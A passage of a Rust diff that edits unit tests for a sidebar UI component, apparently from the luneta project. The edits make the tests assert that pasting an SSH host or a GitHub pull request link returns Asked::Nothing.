         let asked = sidebar.key(&char('r'), moment(160_000));
         let Asked::Pull { on, wanted, others, .. } = asked else {
@@ -11205,7 +11335,7 @@ mod tests {
         sidebar.hear(machines());
         sidebar.focus(Keys::Sidebar);
         sidebar.light(Spot::Machine(Machine::Remote("me@vps".parse().unwrap())));
-        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
+        assert_eq!(sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5"), Asked::Nothing);
         assert!(sidebar.open().is_some());
         assert_eq!(sidebar.key(&char('w'), moment(160_000)), Asked::Nothing);
         assert!(sidebar.open().is_none());
@@ -11376,11 +11506,11 @@ mod tests {
         sidebar.focus(Keys::Sidebar);
         let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
         type_in(&mut sidebar, "nm");
-        sidebar.paste("me@vps\n");
+        assert_eq!(sidebar.paste("me@vps\n"), Asked::Nothing);
         assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Ssh("me@vps".parse().unwrap()));
         let link = "https://github.com/lorenzolfm/luneta/pull/5";
         type_in(&mut sidebar, "nm");
-        sidebar.paste(link);
+        assert_eq!(sidebar.paste(link), Asked::Nothing);
         assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Ssh(link.parse().unwrap()));
     }
 
